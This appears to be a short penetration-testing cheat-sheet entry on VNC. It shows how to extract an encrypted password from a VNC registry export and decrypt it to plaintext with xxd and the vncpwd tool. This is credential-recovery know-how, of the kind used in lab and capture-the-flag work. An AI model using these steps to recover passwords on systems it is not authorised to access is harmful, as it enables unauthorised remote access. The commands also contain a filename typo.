# VNC

### vncpwd

{% code overflow="wrap" %}
```bash
# vncpwd <vnc enc_pass

cat VNC Install.reg
...
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
...

echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pas
/opt/vncpwd/vncpwd vnc_enc_pass
# Password: sT333ve2
```
{% endcode %}
